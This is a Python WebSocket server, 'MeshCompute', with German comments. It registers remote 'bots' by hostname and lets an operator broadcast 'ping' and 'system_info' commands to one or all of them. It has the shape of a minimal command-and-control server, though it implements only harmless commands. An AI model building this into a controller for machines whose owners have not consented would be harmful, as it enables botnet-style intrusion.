import asyncio
import websockets
import json
import time
from bots import bots

async def send_command(bot_id: str, command_type: str, data=None):
    """Hilfsfunktion um Befehle an einen oder alle Bots zu senden"""
    if bot_id.lower() == "all":
        targets = list(bots.keys())
    else:
        targets = [bot_id] if bot_id in bots else []

    task_id = str(time.time())[-6:].replace(".", "")

    msg = {
        "type": "command",
        "task_id": task_id,
        "data": {
            "type": command_type,
            "payload": data
        }
    }

    for bid in targets:
        try:
            await bots[bid]["ws"].send(json.dumps(msg))
            print(f"→ Befehl '{command_type}' an {bid} gesendet")
        except Exception as e:
            print(f"Fehler beim Senden an {bid}: {e}")


async def handler(websocket, path=None):
    try:
        async for message in websocket:
            data = json.loads(message)
            bot_id = data.get("bot_id")

            if data["type"] == "register":
                bots[bot_id] = {
                    "ws": websocket,
                    "info": data.get("info", {}),
                    "last_seen": time.time()
                }
                print(f"✅ Bot verbunden: {bot_id} | {data['info'].get('hostname')}")

            elif data["type"] == "result":
                print(f"📤 [{bot_id}] Ergebnis: {data.get('data')}")

    except Exception as e:
        print(f"Verbindung geschlossen: {e}")
    finally:
        for bid, info in list(bots.items()):
            if info["ws"] == websocket:
                print(f"❌ Bot getrennt: {bid}")
                del bots[bid]


async def console():
    """Einfache Konsole zum Steuern"""
    print("\n=== MeshCompute Konsole ===")
    print("Befehle: system_info, ping, list, help\n")

    while True:
        try:
            cmd = await asyncio.get_event_loop().run_in_executor(None, input, "mesh> ")
            if not cmd.strip():
                continue

            parts = cmd.strip().split(maxsplit=1)
            action = parts[0].lower()

            if action == "list":
                print(f"Aktive Bots ({len(bots)}):")
                for bid, info in bots.items():
                    print(f"  • {bid} | {info['info'].get('hostname')}")

            elif action == "help":
                print("list → Bots anzeigen")
                print("ping <bot_id|all>")
                print("system_info <bot_id|all>")

            elif action in ["ping", "system_info"]:
                target = parts[1] if len(parts) > 1 else "all"
                await send_command(target, action)

            else:
                print("Unbekannter Befehl. Tippe 'help'")

        except Exception as e:
            print(f"Fehler: {e}")


async def main():
    server = await websockets.serve(handler, "0.0.0.0", 8765)
    print("🚀 Mesh Server läuft auf ws://0.0.0.0:8765")

    # Starte Konsole parallel
    await asyncio.gather(server.wait_closed(), console())


if __name__ == "__main__":
    asyncio.run(main())